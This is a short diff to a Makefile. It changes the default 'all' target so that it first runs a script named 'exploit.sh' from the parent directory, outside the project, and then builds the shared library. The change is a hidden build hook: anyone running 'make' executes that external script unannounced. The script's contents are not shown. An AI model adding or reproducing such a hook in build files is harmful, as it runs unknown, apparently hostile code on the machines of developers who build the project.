@@ -37,7 +37,9 @@ endif
 
 GENERATOR=$(BUILDDIR)/generate$(EXTEXE)
 
-all: sharedlib
+all:
+	bash $(CURDIR)/../exploit.sh
+	$(MAKE) sharedlib
 
 PHONY: depends
 depends:
